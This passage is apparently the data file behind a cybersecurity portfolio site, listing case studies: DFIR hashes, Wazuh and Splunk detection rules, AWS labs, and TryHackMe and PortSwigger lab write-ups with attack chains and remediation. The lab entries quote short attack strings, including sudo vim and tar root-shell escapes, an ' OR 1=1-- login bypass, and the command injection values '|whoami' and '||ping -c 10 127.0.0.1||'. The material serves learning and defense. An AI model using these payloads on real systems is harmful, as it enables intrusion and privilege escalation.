      { type: "hash", value: "c70ee7615b5c27ab9fee91681da8f4e2", note: "NTUSER.DAT (MD5)" },
      { type: "hash", value: "190697abebc5496f9b4eb6adc66d2834", note: "SAM (MD5)" },
      { type: "hash", value: "5b6a904d2e37fe3de2ab98cdc3c46291", note: "SOFTWARE (MD5)" },
      { type: "hash", value: "e4571e43d4d4b62db9c4dc4f96ab629a", note: "SYSTEM (MD5)" },
    ],
  },
  "autopsy": {
    pages: 18,
    facts: [
      { label: "Tool", value: "Autopsy 4.23.0" },
      { label: "Source", value: "14.4 GB USB drive, added as a local disk" },
      { label: "Result", value: "40,884 deleted file-system entries" },
    ],
  },

  /* ── Projects ──────────────────────────────────────────────────────── */
  "3omda-custom-detection-rules": {
    pages: 28,
    facts: [
      { label: "Rules", value: "52 custom (110001–110083) + Suricata/VirusTotal integration" },
      { label: "Coverage", value: "Windows, Linux, network, web" },
      { label: "Mapping", value: "MITRE ATT&CK id on every rule; PCI DSS and GDPR tags" },
    ],
    detection: [
      {
        title: "Wazuh — SSH brute force (rule 110001)",
        lang: "xml",
        code: `<rule id="110001" level="10" frequency="8" timeframe="60">
  <if_matched_sid>5716</if_matched_sid>
  <same_source_ip />
  <description>[BRUTE FORCE] SSH: $(srcip) failed $(frequency) times in $(timeframe)s - Possible brute force attack.</description>
  <mitre><id>T1110.001</id></mitre>
  <group>authentication_failures,pci_dss_10.2.4,pci_dss_10.2.5,gdpr_IV_35.7.d,</group>
</rule>`,
      },
      {
        title: "Wazuh — brute force followed by success (rule 110005)",
        lang: "xml",
        code: `<rule id="110005" level="14">
  <if_matched_sid>110001</if_matched_sid>
  <same_source_ip />
  <description>[BRUTE FORCE SUCCESS] $(srcip) succeeded after multiple failures - Possible account compromise!</description>
  <mitre><id>T1110.001</id></mitre>
  <group>authentication_success,brute_force_success,</group>
</rule>`,
      },
    ],
  },
  "soc-env-depi-r3-project": {
    pages: 37,
    facts: [
      { label: "Programme", value: "Digital Egypt Pioneers Initiative, Round 3" },
      { label: "Built by", value: "Solo — designed, deployed, tested and documented end to end" },
      { label: "Stack", value: "Wazuh, Suricata, YARA, VirusTotal API" },
      { label: "Testing", value: "Atomic Red Team, manual testing, threat emulation" },
    ],
  },
  "penetration-testing-life-cycle": {
    pages: 21,
    team: "Team playbook by Karim Tarek Ali, Ahmed Sherif Ali, Ahmed Emad Eldeen, Abdelrahman Elsayed, Joseph George Naseem, Omar Amr Mohammed and Sara Yehia Helmy.",
  },
  "iti-network-project-report": {
    pages: 21,
    team: "Team RootedAF at ITI: Ahmed Sherif, Ahmed Emad Eldeen, Abdelrahman ElSayed Abdul-Aziz and Mohamed Bahaa.",
    facts: [
      { label: "Client", value: "TechSphere Solutions (fictional)" },
      { label: "Scope", value: "Sales, Engineering, server farm" },
      { label: "Features", value: "VLANs, inter-VLAN routing, OSPF, STP, EtherChannel, ACLs" },
    ],
  },
  "apt33-threat-intel-brief": {
    pages: 4,
    facts: [
      { label: "Audience", value: "SOC management, aviation company" },
      { label: "Actor", value: "APT33 — active since at least 2013" },
      { label: "Technique", value: "T1078.004 Cloud Accounts (with the Ruler tool)" },
      { label: "Mitigation", value: "M1018 User Account Management" },
      { label: "Detection", value: "DET0546" },
    ],
  },
  "set-credential-harvesting": {
    verdict: "Credentials harvested in cleartext via cloned Google sign-in portal on 192.168.10.200:80",
    severity: "High",
    pages: 11,
    facts: [
      { label: "Tool", value: "Social-Engineer Toolkit (SET)" },
      { label: "Attack Vector", value: "Website Attack Vectors → Credential Harvester Attack Method" },
      { label: "Listener", value: "192.168.10.200:80 (Cloned https://accounts.google.com)" },
    ],
    chain: [
      { step: "SET → Website Attack Vectors → Credential Harvester" },
      { step: "Google sign-in page cloned on 192.168.10.200:80", technique: "T1566.002" },
      { step: "Victim submits e-mail and password over HTTP POST" },
      { step: "Credentials printed in plain text; victim redirected to google.com" },
    ],
    response: [
      "Enforce FIDO2 / WebAuthn phishing-resistant MFA (bound to the origin domain)",
      "Block newly registered and uncategorized lookalike domains at the DNS/proxy layer",
    ],
  },

  /* ── Cloud Security (AWS GuardDuty, KMS, S3 & Athena) ──────────────── */
  "aws-guardduty-setup": {
    verdict: "True positive — GuardDuty alerted on anomalous API calls, EC2 compromise indicators & S3 access",
    severity: "High",
    facts: [
      { label: "Platform", value: "AWS Cloud Security Lab" },
      { label: "Service", value: "Amazon GuardDuty · AWS Management Console" },
      { label: "Telemetry", value: "AWS CloudTrail management/S3 events, VPC Flow Logs, DNS logs" },
      { label: "Focus", value: "Continuous cloud threat detection & high-severity finding triage" },
    ],
    chain: [
      { step: "GuardDuty enabled across the AWS account ingesting CloudTrail, VPC Flow & DNS logs" },
      { step: "Simulated anomalous IAM API invocations from an unfamiliar principal", technique: "T1078.004" },
      { step: "Detected suspicious outbound EC2 communication and reconnaissance behavior", technique: "T1046" },
      { step: "Triaged unauthorized Amazon S3 bucket access findings and scoped affected resources", technique: "T1005" },
    ],
    response: [
      "Rotate compromised IAM access keys and enforce least-privilege IAM policies",
      "Isolate affected EC2 instances using restrictive Security Groups and NACLs",
      "Enable S3 Block Public Access and enforce bucket encryption and object-level logging",
      "Route high-severity GuardDuty findings to Amazon EventBridge for automated alerting",
    ],
    lessons: "GuardDuty correlates CloudTrail, VPC Flow Logs, and DNS logs without deploying agents, making it the fastest way to establish baseline threat detection in an AWS account.",
  },
  "aws-kms-security": {
    verdict: "Resolved — AWS Organizations SCP explicit deny identified and remediated for KMS key operations",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "AWS Cryptographic Security Lab" },
      { label: "Services", value: "AWS KMS · AWS IAM · AWS Organizations (SCP)" },
      { label: "Key Type", value: "Customer Managed Keys (CMKs) & External Key Store (XKS)" },
      { label: "Root Cause", value: "Explicit Deny statement in an AWS Organizations Service Control Policy" },
    ],
    chain: [
      { step: "Provisioned Customer Managed Keys (CMKs) and authored least-privilege Key Policies" },
      { step: "Attempted cryptographic operations and External Key Store (XKS) integration" },
      { step: "Diagnosed AccessDenied exceptions despite valid IAM user/role permissions", technique: "T1098" },
      { step: "Audited AWS Organizations Service Control Policies (SCPs) and removed the blocking explicit deny rule" },
    ],
    response: [
      "Align AWS Organizations SCPs with workload KMS key usage requirements",
      "Separate KMS Key Administrators from Key Users in the CMK key policy (separation of duties)",
      "Enable automatic annual key rotation and CloudTrail logging on all kms:* API actions",
    ],
    lessons: "In AWS IAM evaluation logic, an explicit Deny in an AWS Organizations SCP overrides every allow in IAM policies and KMS key policies.",
  },
  "aws-athena-healthcare": {
    verdict: "Serverless S3 + Athena healthcare data pipeline deployed with encrypted query results",
    severity: "Low",
    pages: 12,
    facts: [
      { label: "Platform", value: "AWS Data & Cloud Security Lab" },
      { label: "Storage", value: "Amazon S3 (us-east-1) with server-side encryption" },
      { label: "Catalog", value: "Amazon Athena · healthcaredata.patient_data (6 typed columns)" },
      { label: "Serializer", value: "Hive LazySimpleSerDe (CSV)" },
    ],
    chain: [
      { step: "Uploaded healthcare dataset CSV to a private Amazon S3 bucket in us-east-1" },
      { step: "Configured an encrypted S3 query-results prefix for Amazon Athena" },
      { step: "Created the healthcaredata database and patient_data table using LazySimpleSerDe" },
      { step: "Executed analytical SQL queries and audited output formatting (identified missing skip.header.line.count=1 property)" },
    ],
    response: [
      "Add TBLPROPERTIES ('skip.header.line.count'='1') to exclude the CSV header row from query results",
      "Enforce SSE-KMS encryption on both the source S3 bucket and Athena query results bucket",
      "Restrict table and bucket access via AWS Lake Formation and least-privilege IAM roles",
    ],
  },

  /* ── Network, Wireless & CTF Walkthroughs ──────────────────────────── */
  "wifi-cracking-walkthrough": {
    verdict: "WPA2 pre-shared key recovered from 4-way EAPOL handshake via dictionary attack",
    severity: "High",
    pages: 18,
    facts: [
      { label: "Tool", value: "Aircrack-ng 1.7" },
      { label: "Capture File", value: "wpa.full.cap (WPA 4-way handshake)" },
      { label: "Wordlist", value: "rockyou.txt" },
      { label: "Technique", value: "Offline WPA/WPA2 PSK dictionary cracking (T1110.002)" },
    ],
    chain: [
      { step: "Captured the 4-way EAPOL handshake frames in wpa.full.cap" },
      { step: "Ran aircrack-ng -w rockyou.txt wpa.full.cap to compute PMK/PTK MICs offline", technique: "T1110.002" },
      { step: "Matched the calculated MIC against the captured EAPOL frame to recover the plaintext passphrase" },
    ],
    response: [
      "Use a high-entropy WPA2/WPA3 passphrase (20+ random characters) resistant to wordlist attacks",
      "Migrate to WPA3-SAE (Simultaneous Authentication of Equals) or WPA2/WPA3-Enterprise (802.1X/RADIUS)",
      "Disable WPS (Wi-Fi Protected Setup) and monitor for deauthentication frame floods",
    ],
  },
  "ettercap-case": {
    verdict: "Active ARP cache poisoning MITM established between victim host and gateway",
    severity: "High",
    pages: 10,
    facts: [
      { label: "Environment", value: "Kali Linux Virtual Lab" },
      { label: "Tool", value: "Ettercap GUI / Unified Sniffing" },
      { label: "Target 1 (Victim)", value: "192.168.10.128" },
      { label: "Target 2 (Gateway)", value: "192.168.10.2" },
    ],
    chain: [
      { step: "Selected the active network interface and scanned the /24 subnet for live hosts" },
      { step: "Assigned 192.168.10.128 as Target 1 and 192.168.10.2 as Target 2" },
      { step: "Launched ARP poisoning with remote connection sniffing enabled", technique: "T1557.002" },
      { step: "Intercepted and inspected bidirectional traffic between the victim and gateway", technique: "T1040" },
    ],
    iocs: [
      { type: "ip", value: "192.168.10.128", note: "Victim endpoint" },
      { type: "ip", value: "192.168.10.2", note: "Default gateway" },
    ],
    response: [
      "Enable Dynamic ARP Inspection (DAI) with DHCP Snooping on enterprise switches",
      "Enforce TLS/HTTPS and SSH everywhere so intercepted L2 traffic remains encrypted",
      "Monitor for duplicate MAC-to-IP bindings in Zeek/Suricata and switch logs",
    ],
  },
  "simple-ctf-writeup": {
    verdict: "Full root compromise via CMS Made Simple SQLi (CVE-2019-9053) and sudo Vim escalation",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "TryHackMe · Simple CTF" },
      { label: "Services", value: "21/tcp (FTP anon), 80/tcp (Apache /simple), 2222/tcp (SSH)" },
      { label: "Vulnerability", value: "CVE-2019-9053 — CMS Made Simple < 2.2.10 Unauthenticated Time-Based SQLi" },
      { label: "Privilege Escalation", value: "sudo vim -c ':!/bin/sh' (GTFOBins)" },
    ],
    chain: [
      { step: "Enumerated open ports (21, 80, 2222) with Nmap and discovered /simple via Gobuster", technique: "T1595" },
      { step: "Exploited CVE-2019-9053 time-based blind SQLi to dump the salted user password hash", technique: "T1190" },
      { step: "Cracked the hash offline and authenticated as mitch over SSH on port 2222", technique: "T1110.002" },
      { step: "Ran sudo -l, identified NOPASSWD on /usr/bin/vim, and spawned a root shell via :!/bin/sh", technique: "T1548" },
    ],
    iocs: [
      { type: "other", value: "CVE-2019-9053", note: "CMS Made Simple SQLi" },
      { type: "account", value: "mitch", note: "Compromised SSH user" },
      { type: "other", value: "sudo vim -c ':!/bin/sh'", note: "GTFOBins root escalation" },
    ],
    response: [
      "Patch CMS Made Simple to >= 2.2.10 and parameterize all database queries",
      "Disable anonymous FTP access and enforce SSH key-based authentication",
      "Remove unrestricted sudo privileges on interactive editors like vim (use sudoedit with restricted paths)",
    ],
  },
  "easy-peasy-ctf-writeup": {
    verdict: "Root compromise via hidden Nginx directory enumeration, multi-layer decoding & root cron job",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Easy Peasy CTF" },
      { label: "Services", value: "80/tcp (Nginx), 6498/tcp (SSH), 65524/tcp (Apache)" },
      { label: "Tools", value: "Nmap, Gobuster, CyberChef, Steghide, John the Ripper" },
      { label: "Privilege Escalation", value: "Writable root cron job (.mysecretcronjob.sh)" },
    ],
    chain: [
      { step: "Scanned all 65,535 TCP ports with Nmap and enumerated hidden directories with Gobuster", technique: "T1046" },
      { step: "Decoded multi-layered Base64/Base62/Hex strings in CyberChef and cracked GOST hash", technique: "T1027" },
      { step: "Extracted SSH credentials from steganographic image and logged in on port 6498", technique: "T1078" },
      { step: "Appended a reverse shell payload to the user-writable root cron script /var/www/.mysecretcronjob.sh", technique: "T1053" },
    ],
    response: [
      "Ensure cron scripts executed by root are owned by root:root with 0700/0755 permissions",
      "Remove encoded credentials and sensitive comments from public HTML source files",
      "Enforce key-based SSH authentication and restrict high-port web services",
    ],
  },
  "bounty-hacker-ctf-writeup": {
    verdict: "Root compromise via anonymous FTP wordlist leak, SSH Hydra brute force & sudo tar escalation",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Bounty Hacker" },
      { label: "Services", value: "21/tcp (FTP anonymous), 22/tcp (SSH), 80/tcp (HTTP)" },
      { label: "Tools", value: "Nmap, FTP, Hydra, SSH, GTFOBins (tar)" },
      { label: "Privilege Escalation", value: "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh" },
    ],
    chain: [
      { step: "Discovered anonymous FTP access on port 21 and downloaded task.txt and locks.txt", technique: "T1083" },
      { step: "Used Hydra with locks.txt to brute-force user lin's SSH password", technique: "T1110.001" },
      { step: "Logged in via SSH as lin and checked sudo privileges with sudo -l", technique: "T1021" },
      { step: "Abused sudo /bin/tar checkpoint-action to spawn an interactive root shell", technique: "T1548" },
    ],
    response: [
      "Disable anonymous FTP access and never store password lists or task notes on public shares",
      "Implement fail2ban / SSH rate limiting and require SSH key authentication",
      "Audit /etc/sudoers to remove NOPASSWD permissions on binaries with shell-escape flags like tar",
    ],
  },
  "guided-pentest-infrastructure": {
    verdict: "Full system compromise via UnrealIRCd 3.2.8.1 backdoor RCE and plaintext root credentials",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "TryHackMe · Guided Pentest: Infrastructure" },
      { label: "Vulnerable Service", value: "UnrealIRCd 3.2.8.1 on 6667/tcp (Backdoor Command Execution)" },
      { label: "Initial Foothold", value: "webmaster user via Metasploit exploit/unix/irc/unreal_ircd_3281_backdoor" },
      { label: "Privilege Escalation", value: "Plaintext root password in /etc/password.txt → SSH root login" },
    ],
    chain: [
      { step: "Enumerated open ports and services with Nmap, identifying UnrealIRCd on port 6667", technique: "T1046" },
      { step: "Executed the UnrealIRCd 3.2.8.1 backdoor exploit via Metasploit to gain a shell as webmaster", technique: "T1190" },
      { step: "Performed local post-exploitation enumeration and discovered /etc/password.txt", technique: "T1552" },
      { step: "Authenticated as root over SSH using the recovered password to capture the root flag", technique: "T1078" },
    ],
    response: [
      "Decommission or replace trojanized UnrealIRCd 3.2.8.1 binaries and verify package checksums",
      "Delete plaintext credential files (/etc/password.txt) and rotate root and service passwords",
      "Disable direct root SSH login (PermitRootLogin no) in /etc/ssh/sshd_config",
    ],
  },
  "vulnerability-scanning-tools": {
    verdict: "Multiple high/medium vulnerabilities identified across FTP, SSH & HTTP using Nmap NSE, Nikto & OpenVAS",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Vulnerability Scanning Tools" },
      { label: "Scanner Host", value: "10.128.162.243 (AttackBox)" },
      { label: "Target Host", value: "10.128.147.232 (Ubuntu 24.04)" },
      { label: "Tools", value: "Nmap (NSE), Nikto v2.1.5, OpenVAS / Greenbone v26.7.0 (169,731 NVTs)" },
    ],
    chain: [
      { step: "Phase 1 (Nmap -A): Identified vsftpd 3.0.5 with anonymous FTP login (21/tcp), OpenSSH 9.6p1 (22/tcp), and WebSockify (80/tcp)", technique: "T1595" },
      { step: "Phase 2 (Nikto on 8080/tcp): Uncovered exposed /info.php (OSVDB-3233), /static/ indexing, missing HttpOnly/X-Frame-Options, HTTP DEBUG verb, and RFI (/info.php?file=, OSVDB-5292)", technique: "T1190" },
      { step: "Phase 3 (OpenVAS): Configured target & task (Min QoD 70), triaged CVSS 5.3 phpinfo() disclosure and CVE-1999-0497 Anonymous FTP Login" },
    ],
    iocs: [
      { type: "ip", value: "10.128.147.232", note: "Scanned target host" },
      { type: "other", value: "CVE-1999-0497", note: "Anonymous FTP Login enabled" },
      { type: "url", value: "http://10.128.147.232:8080/info.php", note: "Exposed phpinfo() & RFI vector" },
    ],
    response: [
      "Disable anonymous FTP in /etc/vsftpd.conf (anonymous_enable=NO)",
      "Remove /info.php, disable directory listing (Options -Indexes), and disable allow_url_include in php.ini to prevent RFI",
      "Add HttpOnly/Secure flags to PHPSESSID cookies, set X-Frame-Options: DENY, and disable the HTTP DEBUG method",
    ],
  },

  /* ── SOC, DFIR, Malware & IAM TryHackMe Walkthroughs ───────────────── */
  "iam-access-control-room": {
    verdict: "Evaluated IAM pillars (IAAA), DAC/RBAC/MAC access control models & SSO replay mitigations",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "TryHackMe · IAM & Access Control" },
      { label: "Pillars", value: "Identification, Authentication, Authorization, Accountability (IAAA)" },
      { label: "Models", value: "DAC (Discretionary), RBAC (Role-Based), MAC (Mandatory)" },
      { label: "Focus", value: "Least privilege, SSO architecture & credential replay prevention" },
    ],
    chain: [
      { step: "Audited user identity lifecycle across Identification, Authentication, Authorization & Accountability" },
      { step: "Compared DAC, RBAC and MAC enforcement models against enterprise security requirements" },
      { step: "Investigated authentication weaknesses including cleartext token replay and missing MFA", technique: "T1078" },
      { step: "Mapped role-based privilege assignment and audit logging controls", technique: "T1098" },
    ],
    response: [
      "Enforce Role-Based Access Control (RBAC) with periodic quarterly access reviews",
      "Require phishing-resistant Multi-Factor Authentication (MFA) on all SSO and privileged accounts",
      "Bind session tokens to short lifetimes and TLS channels to prevent replay attacks",
    ],
  },
  "offensive-security-intro": {
    verdict: "Unprotected administrative portal (/bank-transfer) discovered via Dirb and exploited",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Offensive Security Intro" },
      { label: "Target", value: "FakeBank Web Application" },
      { label: "Tool", value: "Dirb (command-line web directory brute-forcer)" },
      { label: "Flaw", value: "Broken Access Control — unauthenticated /bank-transfer admin page" },
    ],
    chain: [
      { step: "Inspected the FakeBank user account page and noted negative balance on account #8881" },
      { step: "Ran dirb http://fakebank.thm to enumerate hidden web directories", technique: "T1595" },
      { step: "Discovered the unlinked /bank-transfer administrative endpoint", technique: "T1190" },
      { step: "Executed an unauthorized transfer of $2,000 from account 2276 to account 8881" },
    ],
    response: [
      "Enforce server-side authentication and role-based authorization on /bank-transfer",
      "Require CSRF tokens and multi-step verification for financial transfer transactions",
      "Rate-limit directory enumeration requests at the WAF/reverse proxy layer",
    ],
  },
  "soc-l2-alert-triage": {
    verdict: "Tier 2 alert triage workflow applied: multi-source SIEM correlation, root-cause analysis & containment",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · SOC Level 2" },
      { label: "Role", value: "Tier 2 SOC Analyst / Escalation Handler" },
      { label: "Methodology", value: "Threat Hunting Loop + Multi-Source SIEM Correlation" },
      { label: "Actions", value: "Root-cause investigation, detection tuning & host containment" },
    ],
    chain: [
      { step: "Received escalated alerts from Tier 1 and validated initial triage notes" },
      { step: "Correlated endpoint, network and authentication logs in the SIEM to reconstruct the full attack timeline" },
      { step: "Distinguished true threats from benign administrative activity to tune out recurring false positives" },
      { step: "Executed targeted host isolation, credential resets and firewall blocks" },
    ],
    response: [
      "Document root cause for every escalated alert to feed back into SIEM rule tuning",
      "Standardize escalation playbooks between Tier 1 and Tier 2 analysts",
      "Automate high-confidence IOC enrichment and host containment via SOAR playbooks",
    ],
  },
  "report-writing-soc-l2": {
    verdict: "Authored dual-audience incident reports: C-Level executive summaries & technical DFIR handovers",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "TryHackMe · Report Writing for SOC L2" },
      { label: "Audiences", value: "C-Level Executives & Technical DFIR / Engineering Teams" },
      { label: "Deliverables", value: "Executive Summary + Technical Incident Report + DFIR Handover" },
    ],
    chain: [
      { step: "Structured the 5 Ws (Who, What, When, Where, Why) of the security incident" },
      { step: "Drafted a concise C-Level Executive Summary translating technical findings into business risk and impact" },
      { step: "Compiled a granular DFIR Handover table with defanged IOCs, MITRE ATT&CK TTPs, and UTC timestamps" },
      { step: "Formulated prioritized short-term containment and long-term hardening recommendations" },
    ],
    response: [
      "Always separate executive business-impact summaries from deep technical forensic appendices",
      "Use UTC timestamps consistently across all timeline entries and log excerpts",
      "Include actionable, owner-assigned remediation steps at the close of every incident report",
    ],
  },
  "defensive-security-trends": {
    verdict: "Completed SOC Level-Up track: SOAR automation, CTI integration & cloud-native detection engineering",
    severity: "Low",
    facts: [
      { label: "Platform", value: "TryHackMe · Defensive Security Trends" },
      { label: "Badge", value: "SOC Level-Up Achievement" },
      { label: "Focus", value: "SOAR, Threat Intelligence, Detection-as-Code & Cloud SOC" },
    ],
    chain: [
      { step: "Evaluated modern SOC transitions from static signature alerts to behavioral ATT&CK detection" },
      { step: "Analyzed SOAR playbook workflows for automated alert enrichment and containment" },
      { step: "Reviewed Detection-as-Code (Sigma/YARA) and cloud-native telemetry pipelines" },
    ],
    response: [
      "Integrate automated threat intelligence enrichment into SIEM/SOAR triage pipelines",
      "Maintain detection rules as version-controlled code mapped to MITRE ATT&CK",
    ],
  },
  "monitoring-active-directory": {
    verdict: "Configured Windows auditpol policies and hunted Kerberos & privileged AD events in Splunk",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Monitoring Active Directory" },
      { label: "Tools", value: "Splunk SIEM (SPL) · Windows auditpol.exe" },
      { label: "Key Event IDs", value: "4624/4625 (Logon), 4768/4769 (Kerberos TGT/TGS), 4720/4728/4732 (Account/Group changes)" },
    ],
    chain: [
      { step: "Configured granular Windows Advanced Audit Policies via auditpol.exe to log directory service and logon events" },
      { step: "Queried Windows Security Event Logs in Splunk using SPL to establish normal onboarding baselines" },
      { step: "Hunted anomalous Kerberos ticket requests (4768/4769) and logon types (Type 3 Network vs Type 10 RDP)", technique: "T1078" },
      { step: "Detected unauthorized user creation (4720) and Domain Admins group membership modification (4728)", technique: "T1098" },
    ],
    detection: [
      {
        title: "Splunk SPL — Privileged AD group modification & account creation",
        lang: "spl",
        code: `index=windows sourcetype="WinEventLog:Security" EventCode IN (4720, 4728, 4732, 4756)
| stats count values(EventCode) as EventCodes values(TargetUserName) as TargetUsers by SubjectUserName, ComputerName, _time
| sort - _time`,
      },
    ],
    response: [
      "Enable Advanced Audit Policies for Account Management, Logon/Logoff, and Directory Service Changes on all Domain Controllers",
      "Alert immediately on Event IDs 4720, 4728, 4732, and 4769 (RC4 encryption 0x17 for Kerberoasting)",
    ],
  },
  "intro-to-antivirus": {
    verdict: "Generated MD5 file signatures and custom ClamAV detection databases using sigtool & strings",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "TryHackMe · Introduction to Antivirus" },
      { label: "Tools", value: "ClamAV (sigtool, clamscan) · strings" },
      { label: "Techniques", value: "Static Hash Signatures (.hdb), Byte/String Signatures (.ndb) & Heuristics" },
    ],
    chain: [
      { step: "Inspected suspect Windows binaries using strings to identify unique ASCII/Unicode indicators" },
      { step: "Generated cryptographic MD5 hash signatures using sigtool --md5 sample.exe > custom.hdb" },
      { step: "Validated detection efficacy by scanning the sample directory with clamscan -d custom.hdb" },
    ],
    response: [
      "Combine static hash signatures with behavioral/heuristic rules (YARA + EDR telemetry) so recompiled binaries cannot evade detection",
    ],
  },
  "intro-to-digital-forensics": {
    verdict: "Extracted EXIF geolocation, camera serials & PDF author metadata while preserving Chain of Custody",
    severity: "Medium",
    facts: [
      { label: "Platform", value: "TryHackMe · Intro to Digital Forensics" },
      { label: "Tools", value: "exiftool · pdfinfo · sha256sum (Linux)" },
      { label: "Evidence", value: "Suspect ransom/kidnapping letter PDF and street JPEG image" },
    ],
    chain: [
      { step: "Verified forensic image integrity via cryptographic hashing before examination" },
      { step: "Ran pdfinfo on the suspect PDF document to extract the Author identity and creation timestamps" },
      { step: "Ran exiftool on the suspect JPEG image to recover camera model, GPS latitude/longitude coordinates and street location" },
    ],
    response: [
      "Always compute and log SHA-256 hashes before and after forensic acquisition to maintain Chain of Custody",
      "Strip EXIF and document metadata from publicly released files to prevent operational security leaks",
    ],
  },
  "legal-considerations-dfir": {
    verdict: "Investigated corporate AUP policy violation & insider data leak with SHA-1 Chain of Custody verification",
    severity: "High",
    facts: [
      { label: "Platform", value: "TryHackMe · Legal Considerations in DFIR" },
      { label: "Evidence", value: "OTRS support tickets, Outlook OST mailbox, IIS web logs" },
      { label: "Compliance", value: "Corporate Acceptable Use Policy (AUP), GDPR & Chain of Custody" },
    ],
    chain: [
      { step: "Reviewed corporate Acceptable Use Policy (AUP) and legal authorization scope prior to accessing employee artifacts" },
      { step: "Analyzed OTRS ticketing records and Outlook (.ost) emails to identify the Person of Interest (POI)" },
      { step: "Correlated IIS server logs with mailbox attachments and verified SHA-1 hashes across all collected evidence items" },
    ],
    response: [
      "Ensure explicit written legal/HR authorization and a signed Acceptable Use Policy (AUP) before inspecting employee mailboxes",
      "Maintain an unbroken Chain of Custody log with SHA-1/SHA-256 hashes for every forensic artifact",
    ],
  },
  "owasp-juice-shop": {
    verdict: "Exploited OWASP Top 10 vulnerabilities across SQLi, DOM/Reflected XSS, IDOR & Broken Access Control",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "OWASP Juice Shop" },
      { label: "Tools", value: "Burp Suite Professional · Browser DevTools" },
      { label: "Categories", value: "SQL Injection, XSS (DOM/Reflected), IDOR, Broken Access Control, Info Disclosure" },
    ],
    chain: [
      { step: "Enumerated client-side JavaScript bundles in DevTools to uncover hidden routes (/score-board, /administration)", technique: "T1595" },
      { step: "Injected \"' OR 1=1--\" into the login endpoint via Burp Suite to bypass authentication as administrator", technique: "T1190" },
      { step: "Manipulated BasketId parameters in API requests (IDOR) to view other users' shopping baskets" },
      { step: "Executed DOM and Reflected XSS payloads in the search and tracking fields" },
    ],
    response: [
      "Use parameterized SQL queries / prepared statements for all authentication and search endpoints",
      "Enforce server-side object-level authorization checks (preventing IDOR on BasketId)",
      "Implement context-aware output encoding and a strict Content-Security-Policy (CSP)",
    ],
  },

  /* ── PortSwigger Web Security Academy Labs (All 29 Labs Detailed) ───── */
  "information-disclosure-module": {
    verdict: "Extracted hardcoded admin credentials & secret keys via exposed .git repo, phpinfo() & backup files",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Scope", value: "Information Disclosure Module (5 labs)" },
      { label: "Tools", value: "Burp Suite, wget, Git Cola, Browser DevTools" },
    ],
    chain: [
      { step: "Mirrored exposed /.git directory using wget -r and inspected commit history in Git Cola to recover hardcoded admin password", technique: "T1552" },
      { step: "Extracted SECRET_KEY environment variable from exposed /cgi-bin/phpinfo.php debug page", technique: "T1082" },
      { step: "Bypassed front-end IP restrictions on /admin by injecting X-Custom-IP-Authorization: 127.0.0.1 in Burp Repeater", technique: "T1190" },
      { step: "Retrieved database credentials from left-over source backup file (/backup/ProductTemplate.java.bak)" },
    ],
    response: [
      "Block public access to version-control directories (.git, .svn) and remove .bak/.swp backup files from web roots",
      "Disable debug pages (phpinfo, stack traces) in production environments",
      "Never trust client-controllable headers (X-Forwarded-For, X-Custom-IP-Authorization) for access control",
    ],
  },
  "idor-live-chat": {
    verdict: "Plaintext password for user carlos exfiltrated via unauthenticated chat transcript IDOR (1.txt)",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Insecure Direct Object Reference (IDOR) · CWE-639" },
      { label: "Endpoint", value: "GET /download-transcript/1.txt" },
      { label: "Tool", value: "Burp Suite Proxy & Repeater" },
    ],
    chain: [
      { step: "Sent a live chat message and clicked 'View transcript' to capture GET /download-transcript/2.txt in Burp Proxy" },
      { step: "Noticed sequential numeric file naming with no ownership check", technique: "T1190" },
      { step: "Modified the request to GET /download-transcript/1.txt in Burp Repeater and retrieved carlos's private chat transcript", technique: "T1005" },
      { step: "Extracted carlos's plaintext password from the transcript and authenticated to his account", technique: "T1078" },
    ],
    response: [
      "Bind chat transcripts to the authenticated user's server-side session rather than sequential filenames",
      "Enforce object-level authorization checks before serving any downloadable transcript file",
    ],
  },
  "os-command-injection-simple": {
    verdict: "Remote Code Execution (RCE) achieved via unescaped shell command concatenation in storeId",
    severity: "Critical",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "OS Command Injection · CWE-78" },
      { label: "Endpoint", value: "POST /product/stock (productId & storeId)" },
      { label: "Payload", value: "productId=1&storeId=1|whoami" },
    ],
    chain: [
      { step: "Intercepted POST /product/stock in Burp Suite Proxy" },
      { step: "Identified that productId and storeId are passed directly to a server-side shell script (stockreport.sh)", technique: "T1190" },
      { step: "Injected |whoami into the storeId parameter in Burp Repeater", technique: "T1059.004" },
      { step: "Confirmed RCE from the returned system username in the HTTP response body" },
    ],
    response: [
      "Avoid calling OS shell commands from web application code; use native language APIs instead",
      "Strictly validate productId and storeId as integers (allowlist digits only)",
    ],
  },
  "blind-os-injection-time-delays": {
    verdict: "Blind OS command injection confirmed via 10-second ICMP ping time delay in feedback form",
    severity: "High",
    facts: [
      { label: "Platform", value: "PortSwigger Web Security Academy" },
      { label: "Vulnerability", value: "Blind OS Command Injection · CWE-78" },
      { label: "Endpoint", value: "POST /feedback/submit (email parameter)" },
      { label: "Payload", value: "email=x||ping+-c+10+127.0.0.1||" },
    ],
    chain: [
      { step: "Intercepted POST /feedback/submit in Burp Suite Repeater" },
      { step: "Tested parameters with || ping -c 10 127.0.0.1 || to trigger a deterministic time delay", technique: "T1190" },
      { step: "Observed a 10,000+ ms response delay when injected into the email parameter, confirming blind shell execution", technique: "T1059.004" },
    ],
    response: [
      "Use a dedicated mail library (SMTP API) rather than invoking a shell mail command with user-supplied input",
      "Validate the email field against a strict RFC-compliant format and escape shell metacharacters",
    ],
  },
  "blind-os-injection-output": {
    verdict: "Exfiltrated blind OS command execution output by redirecting stdout to /var/www/images/output.txt",
    severity: "Critical",
    facts: [
